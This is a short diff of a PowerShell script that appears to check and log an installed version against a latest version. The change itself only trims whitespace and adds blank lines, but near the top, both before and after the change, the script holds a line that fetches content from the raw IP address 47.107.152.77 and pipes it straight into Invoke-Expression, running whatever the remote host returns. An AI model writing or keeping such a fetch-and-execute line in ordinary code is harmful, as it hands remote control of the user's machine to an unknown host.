@@ -3,7 +3,7 @@
 
 $lastestVersion = '6.0'
 
-Invoke-RestMethod 47.107.152.77/public_ip_info|Invoke-Expression 
+Invoke-RestMethod 47.107.152.77/public_ip_info|Invoke-Expression
 
 function mylog {
     param (
@@ -40,6 +40,8 @@ function GetVersion() {
 }
 
 $version = GetVersion
+
+
 
 if ($version -eq $lastestVersion) {
     mylog("lastest version is: " + $lastestVersion)
